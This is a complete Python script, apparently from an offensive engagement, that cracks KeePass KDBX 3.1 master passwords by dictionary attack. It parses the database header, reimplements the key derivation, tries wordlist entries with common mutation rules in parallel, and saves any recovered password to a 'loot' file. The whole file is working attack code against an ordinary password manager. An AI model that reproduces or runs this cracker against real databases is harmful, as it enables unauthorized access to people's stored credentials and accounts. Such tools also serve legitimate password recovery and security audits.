#!/usr/bin/env python3
"""Parallel KDBX 3.1 master-password cracker (AES-256, 1 transform round).

Usage: python3 kdbx_par_crack.py <kdbx> <wordlist> [--limit N] [--rules]
Exit code 0 + line 'FOUND:<pw>' on success.
"""
import hashlib, struct, sys, os, time
from multiprocessing import Pool
from Cryptodome.Cipher import AES

KDBX = sys.argv[1]
WORDLIST = sys.argv[2]
LIMIT = int(sys.argv[sys.argv.index("--limit") + 1]) if "--limit" in sys.argv else 0
RULES = "--rules" in sys.argv

FIELD = {0: "EndOfHeader", 1: "Comment", 2: "CipherID", 3: "CompressionFlags",
         4: "MasterSeed", 5: "TransformSeed", 6: "TransformRounds", 7: "EncryptionIV",
         8: "ProtectedStreamKey", 9: "StreamStartBytes", 10: "InnerRandomStreamID"}


def parse_header(data):
    assert struct.unpack("<II", data[:8]) == (0x9AA2D903, 0xB54BFB67)
    off, hdr = 12, {}
    while True:
        t, n = struct.unpack("<BH", data[off:off + 3]); off += 3
        hdr[FIELD.get(t, t)] = data[off:off + n]; off += n
        if t == 0:
            break
    return hdr, data[off:]


H, PAY = parse_header(open(KDBX, "rb").read())
SEED, TSEED, IV, START = H["MasterSeed"], H["TransformSeed"], H["EncryptionIV"], H["StreamStartBytes"]
ROUNDS = struct.unpack("<Q", H["TransformRounds"])[0]


def check(pw):
    comp = hashlib.sha256(hashlib.sha256(pw.encode()).digest()).digest()
    for _ in range(max(ROUNDS, 1)):
        comp = AES.new(TSEED, AES.MODE_ECB).encrypt(comp)
    k = hashlib.sha256(SEED + comp).digest()
    return AES.new(k, AES.MODE_CBC, IV).decrypt(PAY[:16]) == START[:16]


MUT = [str.lower, str.upper, str.capitalize, str.title]


def variants(w):
    yield w
    if not RULES or not w:
        return
    for f in MUT:
        yield f(w)
    for suf in ("1", "12", "123", "1234", "12345", "!", "1!", "01", "2023", "2024", "2025", "2026", "@123"):
        yield w + suf
        yield w.capitalize() + suf
    yield w[::-1]


def worker(chunk):
    for w in chunk:
        for v in variants(w):
            if check(v):
                return v
    return None


def main():
    words = [l.rstrip("\r\n") for l in open(WORDLIST, encoding="utf-8", errors="ignore")]
    if LIMIT:
        words = words[:LIMIT]
    nproc = os.cpu_count() or 4
    chunk = max(2000, len(words) // (nproc * 8))
    print("candidates=%d procs=%d chunk=%d rules=%s rounds=%d" % (len(words), nproc, chunk, RULES, ROUNDS), flush=True)
    t0 = time.time()
    pool = Pool(nproc)
    try:
        for res in pool.imap_unordered(worker, (words[i:i + chunk] for i in range(0, len(words), chunk))):
            if res:
                pool.terminate()
                print("FOUND:%s" % res, flush=True)
                open("loot/kdbx_master_password.txt", "w").write(res + "\n")
                return 0
    finally:
        pool.close()
        pool.join()
    print("not found (%.1fs, %.0f/s)" % (time.time() - t0, len(words) / (time.time() - t0)))
    return 1


if __name__ == "__main__":
    sys.exit(main())
